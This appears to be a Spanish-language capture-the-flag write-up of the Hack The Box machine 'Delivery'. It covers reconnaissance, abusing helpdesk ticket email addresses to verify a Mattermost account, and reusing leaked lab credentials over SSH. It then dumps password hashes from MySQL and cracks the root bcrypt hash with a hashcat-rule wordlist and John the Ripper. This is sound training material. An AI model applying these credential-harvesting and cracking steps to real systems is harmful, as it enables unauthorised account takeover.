---
layout: post
title:  "Maquina  Retirada Delivery de Hack The Box (Necesario VIP) creada por IppSec"
description: En esta ocasion empezaremos con el Writeup de la maquina de HackTheBox llamada DELIVERY
tags: HTB, Mattermost, OSTicket, Hijacking, Web Hacking, Maquinas Retiradas, Writeup
---

# Delivery ~ Hack The Box

Realizamos el Primer escaneo con Nmap
```bash
$" nmap -p- --open -sS -T5 -v -n -Pn -oG allports 10.10.10.222       "
``` 
Procedemos con el siguiente escaneo de Nmap
```bash
$" nmap -sC -sV -p22,80,8065 -oN target 10.10.10.222 
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 9c:40:fa:85:9b:01:ac:ac:0e:bc:0c:19:51:8a:ee:27 (RSA)
|   256 5a:0c:c0:3b:9b:76:55:2e:6e:c4:f4:b9:5d:76:17:09 (ECDSA)
|_  256 b7:9d:f7:48:9d:a2:f2:76:30:fd:42:d3:35:3a:80:8c (ED25519)
80/tcp   open  http    nginx 1.14.2
|_http-server-header: nginx/1.14.2
|_http-title: Welcome
8065/tcp open  unknown
| fingerprint-strings: 
|   GenericLines, Help, RTSPRequest, SSLSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Accept-Ranges: bytes
|     Cache-Control: no-cache, max-age=31556926, public
|     Content-Length: 3108
|     Content-Security-Policy: frame-ancestors 'self'; script-src 'self' cdn.rudderlabs.com
|     Content-Type: text/html; charset=utf-8
|     Last-Modified: Sun, 23 May 2021 17:08:55 GMT
|     X-Frame-Options: SAMEORIGIN
|     X-Request-Id: uph4ycmdh7nburmh9a51qz8x9h
|     X-Version-Id: 5.30.0.5.30.1.57fb31b889bf81d99d8af8176d4bbaaa.false
|     Date: Sun, 23 May 2021 17:11:05 GMT
|     <!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=0"><meta name="robots" content="noindex, nofollow"><meta name="referrer" content="no-referrer"><title>Mattermost</title><meta name="mobile-web-app-capable" content="yes"><meta name="application-name" content="Mattermost"><meta name="format-detection" content="telephone=no"><link re
|   HTTPOptions: 
|     HTTP/1.0 405 Method Not Allowed
|     Date: Sun, 23 May 2021 17:11:05 GMT
|_    Content-Length: 0
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8065-TCP:V=7.91%I=7%D=5/23%Time=60AA8CA7%P=x86_64-pc-linux-gnu%r(Ge
SF:nericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20t
SF:ext/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x
SF:20Request")%r(GetRequest,DF3,"HTTP/1\.0\x20200\x20OK\r\nAccept-Ranges:\
SF:x20bytes\r\nCache-Control:\x20no-cache,\x20max-age=31556926,\x20public\
SF:r\nContent-Length:\x203108\r\nContent-Security-Policy:\x20frame-ancesto
SF:rs\x20'self';\x20script-src\x20'self'\x20cdn\.rudderlabs\.com\r\nConten
SF:t-Type:\x20text/html;\x20charset=utf-8\r\nLast-Modified:\x20Sun,\x2023\
SF:x20May\x202021\x2017:08:55\x20GMT\r\nX-Frame-Options:\x20SAMEORIGIN\r\n
SF:X-Request-Id:\x20uph4ycmdh7nburmh9a51qz8x9h\r\nX-Version-Id:\x205\.30\.
SF:0\.5\.30\.1\.57fb31b889bf81d99d8af8176d4bbaaa\.false\r\nDate:\x20Sun,\x
SF:2023\x20May\x202021\x2017:11:05\x20GMT\r\n\r\n<!doctype\x20html><html\x
SF:20lang=\"en\"><head><meta\x20charset=\"utf-8\"><meta\x20name=\"viewport
SF:\"\x20content=\"width=device-width,initial-scale=1,maximum-scale=1,user
SF:-scalable=0\"><meta\x20name=\"robots\"\x20content=\"noindex,\x20nofollo
SF:w\"><meta\x20name=\"referrer\"\x20content=\"no-referrer\"><title>Matter
SF:most</title><meta\x20name=\"mobile-web-app-capable\"\x20content=\"yes\"
SF:><meta\x20name=\"application-name\"\x20content=\"Mattermost\"><meta\x20
SF:name=\"format-detection\"\x20content=\"telephone=no\"><link\x20re")%r(H
SF:TTPOptions,5B,"HTTP/1\.0\x20405\x20Method\x20Not\x20Allowed\r\nDate:\x2
SF:0Sun,\x2023\x20May\x202021\x2017:11:05\x20GMT\r\nContent-Length:\x200\r
SF:\n\r\n")%r(RTSPRequest,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConten
SF:t-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n
SF:400\x20Bad\x20Request")%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r
SF:\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close
SF:\r\n\r\n400\x20Bad\x20Request")%r(SSLSessionReq,67,"HTTP/1\.1\x20400\x2
SF:0Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nCon
SF:nection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(TerminalServerCookie
SF:,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;
SF:\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request"
SF:);
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 98.68 seconds
```

Efectuamos un reconocimiento con la herramienta `whatweb` en los dos puertos `HTTP`:
Puerto 80
```bash
# cat Wweb              
http://10.10.10.222:8065 [200 OK] Country[RESERVED][ZZ], HTML5, IP[10.10.10.222], Script, Title[Mattermost], UncommonHeaders[content-security-policy,x-request-id,x-version-id], X-Frame-Options[SAMEORIGIN]
```
Puerto 8065
```bash
# cat ../content/Wweb                                                                                                                                1 ⨯
http://10.10.10.222:8065 [200 OK] Country[RESERVED][ZZ], HTML5, IP[10.10.10.222], Script, Title[Mattermost], UncommonHeaders[content-security-policy,x-request-id,x-version-id], X-Frame-Options[SAMEORIGIN]
```
Procedemos a hacer un reconocimiento visual de las paginas web

_foto_

Vemos que la pagina web nos redirecciona a una dominio llamado `helpdesk.delivery.htb`
Procedemos a introducir el dominio de `helpdesk.delivery.htb` en nuestro archivo `/etc/hosts` junto con la IP de la Maquina.
Procedemos a hechar un vistazo a `helpdesk.delivery.htb`

_foto_

Nos Registramos y creamos un nuevo ticket.

_foto_

Vemos que nos crea un Nº de ticket y un mail personal con el numero de ticket. Vale

Ahora procedemos a hecharle un vistazo a la web por el Puerto 8065

_foto_

Vemos que tambien podemos Registrarnos, Aqui es donde reside la vulnerabilidad de redireccionamiento del mail atraves del mail del ticket abierto anteriormente.

_foto_

Una vez Registrados en la web `Mattermost` con el mail obtenido en el ticket, recargariamos la pagina donde habiamos creado el ticket `helpdesk.delivery.htb` y vemos que nos han enviado
el enlace de activacion de la cuenta que nos creamos a ese mismo mail. Nos copiamos el enlace y vemos que tenemos que añadir un dominio mas a nuestro `/etc/host/` 
para hacer uso del mismo enlace de activacion. Lo añadimos y procedemos a pegar la url para ver la respuesta del servidor. Nos valida la direccion de mail y ya podriamos probar a loguearnos 
en la pagina web de `Mattermost` con la cuenta y contraseña que habiamos creado previamiente.

_foto_

Encontramos nada mas loguearnos unas credenciales:
```bash
User: "maildeliverer"
Pass: "Youve_Got_Mail!"
```
Como la Maquina Tenia el servicio `SSH` abierto probamos con las credenciales obtenidas
Y vemos que accedemos a la maquina como el user `maildeliverer` y ya podriamos acceder a la flag `user.txt`
```bash
# ssh maildeliverer@10.10.10.222
maildeliverer@10.10.10.222's password: 
Linux Delivery 4.19.0-13-amd64 #1 SMP Debian 4.19.160-2 (2020-11-28) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun May 23 14:04:46 2021 from 10.10.14.5

maildeliverer@Delivery:~$ cat user.txt 
4730c809147e4f969543a0ef........
```

# Escalada de privilegios hasta el user Root

Listamos el `/etc/passwd` y grepeamos por `$sh` para los usuarios que hay en la maquina a nivel de sistema.
Encontramos al user `mattermost`
Procedemos con la busqueda:
```bash
find / -group mattermost -name *config* -type f 2>/dev/null
"cat /opt/mattermost/config/config.json"
```
 Obtenemos mucha informacion y mirando detalladamente encontramos unas claves para el servicio `mysql` 
 ```bash
 User: mmuser
 Pass: Crack_The_MM_Admin_PW`
```
Probamos a acceder al servicio `MySQL`
```bash
"maildeliverer@Delivery:~$ mysql -ummuser -p        "
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 199
Server version: 10.3.27-MariaDB-0+deb10u1 Debian 10

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

"MariaDB [(none)]> show databases;    "
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mattermost         |
+--------------------+
2 rows in set (0.001 sec)

"MariaDB [(none)]> use mattermost;   "
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
"MariaDB [mattermost]> select Username,Password from Users;  "
+----------------------------------+--------------------------------------------------------------+
| Username                         | Password                                                      |
+----------------------------------+--------------------------------------------------------------+
| root                             | $2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJXXXXX  |
|+----------------------------------+--------------------------------------------------------------+
10 rows in set (0.000 sec)
```
Genial Encontramos varios Hashes pero nos quedamos solo con el de root. Justo ahora podemos hacer memoria para ver lo que se nos decia en la pagina de Mattermost nada mas loguearnos
La contraseña puede ser una variante de la contraseña `"PleaseSubscribe!"`. Asique nos podemos montar un diccionario con variaciones de esta contraseña, hacemos uso de `Hascat`,  y posteriormente intentar crackearla con la 
herramienta `John The Ripper`.
```bash
# hashcat -r /usr/share/hashcat/rules/best64.rule dicc --stdout
PleaseSubscribe!
!ebircsbuSesaelP
PLEASESUBSCRIBE!
pleaseSubscribe!
PleaseSubscribe!0
PleaseSubscribe!1
PleaseSubscribe!2
PleaseSubscribe!3
PleaseSubscribe!4
PleaseSubscribe!5
PleaseSubscribe!6
PleaseSubscribe!7
PleaseSubscribe!8
PleaseSubscribe!9
PleaseSubscribe!00
PleaseSubscribe!01
PleaseSubscribe!02
PleaseSubscribe!11
..etc..
..etc..
..etc..

# hashcat -r /usr/share/hashcat/rules/best64.rule dicc --stdout >> dicc
```
Una vez que ya tenemos nuestro diccionario creado con las `reglas de hashcat` procedemos a crackear el hash de root con la herramienta `JohnTheRipper`
```bash
# john --wordlist=dicc hash        
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
"PleaseSubscribe!xx (?)"
1g 0:00:00:00 DONE (2021-05-23 20:44) 1.492g/s 107.4p/s 107.4c/s 107.4C/s PleaseSubscribe!..PlesPles
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```
Y ya tendriamos la contraseña de `root`.
Podriamos hacer un `su root` pegar la contraseña y posteriormente coseguir la flag de `root.txt`

Maquina Rooteada =)




























